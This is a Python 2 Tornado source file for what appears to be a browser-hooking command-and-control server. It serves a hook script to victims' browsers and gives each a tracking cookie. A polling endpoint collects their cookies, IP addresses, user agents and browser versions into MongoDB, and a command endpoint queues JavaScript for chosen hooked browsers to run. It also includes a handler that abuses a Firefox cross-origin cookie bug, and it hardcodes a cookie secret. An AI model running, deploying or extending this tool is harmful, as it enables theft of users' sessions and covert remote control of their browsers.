#coding=utf-8

import os.path
import sys
import tornado.httpserver
import tornado.ioloop
import tornado.options
import tornado.web
from tornado.options import define, options

import random
import string
import configparser
import pymongo

import tornado.websocket

cmd = ''
cmd_id = ''

#  get acount information
def acount_info():
    config = configparser.ConfigParser()
    config.read('user.cfg')
    username = config['acount']['username']
    password = config['acount']['password']
    return username,password

def database_init():
    data_path = sys.path[0]+'/data'
    os.system('mongod --dbpath '+data_path+' >> '+data_path+'/db.log')

class Application(tornado.web.Application):
    def __init__(self):
        handlers=[(r'/', IndexHandler),
                (r'/shell', LoginPageHandler),
                (r'/hook.js',HookHandler),
                (r'/ws',EchoWebSocket),
#                (r'/hello',HelloHandler),
                (r'/cookie',SetCookieHandler),
                (r'/hook_tree',TreeHandler),
                (r'/poll',PollHandler),
                (r'/command',CommandHandler),
                ]

        setting={
        "template_path":os.path.join(os.path.dirname(__file__),"templates"),
        "static_path":os.path.join(os.path.dirname(__file__),"templates/static"),
        "cookie_secret":"61oETzKXQAGaYdkL5gEmGeJJFuYh7EQnp2XdTP1o/Vo=",
        }
        
#        database_init()
        tornado.web.Application.__init__(self,handlers,**setting)

define("port", default=8000, help="run on the given port", type=int)

class IndexHandler(tornado.web.RequestHandler):
    def get(self):
        self.render('index.html')

class HookHandler(tornado.web.RequestHandler):
    def get(self):
        if self.get_cookie("hook_id")==None:
            self.set_cookie("hook_id",self.genrandom())

        self.render('static/hook.js')

    def genrandom(self):
        cookie=''
        for i in range(32):
            cookie+=random.choice(string.uppercase+string.lowercase+"0123456789")
        return cookie

class LoginPageHandler(tornado.web.RequestHandler):
    def post(self):
        username = self.get_argument('username')
        password = self.get_argument('passwd')
        if not self.get_secure_cookie("su_cookie"):
            self.set_secure_cookie("su_cookie",username)
        else:    
            if username==acount_info()[0] and password==acount_info()[1]:
                self.render('shell.html')
            else:
                self.write("invaild username or password")
    def get(self):
        if self.get_secure_cookie('su_cookie')==acount_info()[0]:
            self.render('shell.html')


class EchoWebSocket(tornado.websocket.WebSocketHandler):
    def open(self):
        print "websocket open"
    
    def on_message(self,message):
        self.write_message("alert(1);")

    def on_close(self):
        print "websocket close"
    
    def check_origin(self,origin):
        return True

#for firefox cross orign cookie set bug 
class SetCookieHandler(tornado.web.RequestHandler):
    def get(self):
        self.redirect("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=aaa' /></html></foreignObject></svg>")
        
#return hook browser list with json 
class TreeHandler(tornado.web.RequestHandler):
    def get(self):
        self.set_header('Access-Control-Allow-Origin','*')
        self.set_header('Content-Type','application/json')
        client = pymongo.MongoClient("mongodb://localhost:27017")
        db = client.hookbrowser
        res={}
        i=0
        for doc in db.info.find():
            del doc["_id"]
            res.update({"hook"+str(i):doc})
            i+=1
        self.write(res)


class PollHandler(tornado.web.RequestHandler):
    def check_id_in(self,hook_id,db):
        for doc in db.info.find():
            if hook_id == doc["hook_id"]:
                return True        
        return False

    def save_db(self):
        header=dict(self.request.headers)
        ua=header["User-Agent"]
        hook_id = self.get_cookie("hook_id")
        IP = self.get_argument("IP")
        cookies = self.get_argument("cookies")
        browser_version = self.get_argument("version")
        print "saving"

        client = pymongo.MongoClient("mongodb://localhost:27017")
        db = client.hookbrowser
        if self.check_id_in(hook_id,db):
            print "already in "
        else:
            db.info.insert({"ua":ua,"hook_id":hook_id,"IP":IP,"cookies":cookies,"browser_version":browser_version})

    def post(self):
        header = dict(self.request.headers)
        origin = header["Origin"]
        self.set_header("Access-Control-Allow-Origin",origin)
        self.set_header("Access-Control-Allow-Credentials","true")

        hook_id = self.get_cookie("hook_id")
        print "hook_id"+hook_id
        
        global cmd 
        global cmd_id
        if cmd!='' and hook_id==cmd_id:
            self.write(cmd)
            cmd = ''

        if hook_id:
            self.save_db()

class CommandHandler(tornado.web.RequestHandler):
    def post(self):
        global cmd
        global cmd_id
        cmd = self.get_argument('cmd')
        cmd_id = self.get_argument('cmd_id')

if __name__ == '__main__':
    tornado.options.parse_command_line()
    http_server = tornado.httpserver.HTTPServer(Application())
    http_server.listen(options.port)
    tornado.ioloop.IOLoop.instance().start()
